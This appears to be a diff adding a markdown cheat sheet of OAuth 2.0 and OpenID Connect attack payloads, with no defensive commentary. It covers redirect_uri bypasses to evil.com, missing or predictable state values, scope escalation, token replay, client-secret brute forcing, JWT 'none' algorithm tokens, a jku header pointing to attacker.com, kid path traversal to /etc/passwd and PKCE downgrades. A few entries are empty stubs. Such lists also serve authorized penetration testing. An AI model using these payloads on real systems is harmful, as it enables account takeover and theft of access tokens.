@@ -1,0 +1,155 @@
+# OAuth 2.0 Attack Payloads
+
+## Authorization Endpoint Attacks
+
+### Redirect URI Bypass
+
+```
+# Null byte
+redirect_uri=https://target.com%00.evil.com
+
+# Path traversal  
+redirect_uri=https://target.com/../evil.com
+
+# Subdomain takeovers
+redirect_uri=https://target-evil.com
+redirect_uri=https://target.com.evil.com
+
+# HTTP vs HTTPS
+redirect_uri=http://target.com
+
+# Fragment bypass
+redirect_uri=https://target.com#@evil.com
+```
+
+### State Parameter Attacks
+
+```
+# No state parameter
+GET /authorize?client_id=app&response_type=code&redirect_uri=https://app.com/callback
+
+# Empty state
+&state=
+
+# Predictable state
+&state=1
+&state=12345
+&state=session_123
+```
+
+### Scope Escalation
+
+```
+# Add extra scopes
+&scope=openid,profile,email,admin
+
+# Request all available
+&scope=*
+
+# Try default denied scopes
+&scope=read:admin,write:admin
+```
+
+## Token Endpoint Attacks
+
+### Token Replay
+
+```
+# Reuse authorization code
+POST /token
+grant_type=authorization_code
+code=SplxlOBeZQQYbYS6WxSbIA
+redirect_uri=https://app.com/callback
+```
+
+### Client Secret Brute Force
+
+```
+POST /token
+grant_type=client_credentials
+client_id=app
+client_secret=password
+```
+
+## JWT Attacks in OAuth
+
+### Algorithm Confusion
+
+```
+# None algorithm
+{"alg":"none","typ":"JWT"}
+{"alg":"None","typ":"JWT"}
+
+# HS256 with known secret
+{"alg":"HS256","typ":"JWT","kid":"..."}
+
+# Use public key as HMAC secret
+{"alg":"RS256","jku":"https://attacker.com/keys.json"}
+```
+
+### Key ID Injection
+
+```
+{"alg":"RS256","kid":"../../etc/passwd"}
+{"alg":"RS256","kid":"1"}
+{"alg":"RS256","kid":"../../app/config"}
+```
+
+## Refresh Token Attacks
+
+```
+# Enumerate refresh tokens
+POST /token
+grant_type=refresh_token
+refresh_token=invalid_token
+
+# Try common tokens
+refresh_token=eyJhbGciOiJIUzI1NiJ9
+```
+
+## PKCE Bypass
+
+```
+# Remove code_verifier
+# Try short code_verifier
+code_verifier=123
+
+# Predictable code_challenge
+code_challenge=abc
+code_challenge_method=plain
+```
+
+## OAuth 2.0 Callback Attacks
+
+```
+# Token in URL
+https://app.com/callback#access_token=xxx
+
+# Check referer leakage
+# Check browser cache
+```
+
+## OpenID Connect Attacks
+
+### ID Token Validation
+
+```
+# Change audience
+{"iss":"https://target.com","aud":["app1","app2"]}
+
+# Expiration
+{"exp":9999999999}
+
+# Sign with none
+{"alg":"none","typ":"JWT"}
+```
+
+### UserInfo Endpoint
+
+```
+# Enumerate emails
+GET /userinfo
+Authorization: Bearer <token>
+
+# SQLi in claims
+```
